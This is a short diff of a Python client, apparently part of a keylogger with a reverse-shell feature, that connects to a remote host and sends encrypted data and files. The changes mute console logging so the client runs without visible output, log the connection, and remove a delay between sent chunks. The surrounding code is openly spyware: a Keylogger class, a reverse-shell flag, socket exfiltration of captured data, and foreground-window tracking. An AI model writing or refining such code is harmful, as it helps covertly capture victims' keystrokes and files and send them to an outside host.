@@ -15,7 +15,8 @@ from screeninfo import get_monitors
 from threading import Thread
 from win32gui import GetWindowText, GetForegroundWindow
 
-logging.basicConfig(level=logging.DEBUG) # Later set to logging.WARNING in order to mute the client
+#logging.basicConfig(level=logging.DEBUG) # Show Console Output
+logging.basicConfig(level=logging.WARN) # Dont show Console Output
 reverse_shell_active = False
 
 class Keylogger:
@@ -127,6 +128,7 @@ class Keylogger:
         while not self.connected:
             try:
                 self.sock.connect((self.host, self.port))
+                logging.debug("Connected")
                 self.connected = True
             except socket.error as err:
                 self.connected = False
@@ -149,7 +151,6 @@ class Keylogger:
         
         for chunk in chunks:
             self.encrypt_and_send(chunk)
-            time.sleep(0.00001)
 
         if filename:
             self.encrypt_and_send("done sending file".encode(utils.ENCODING))
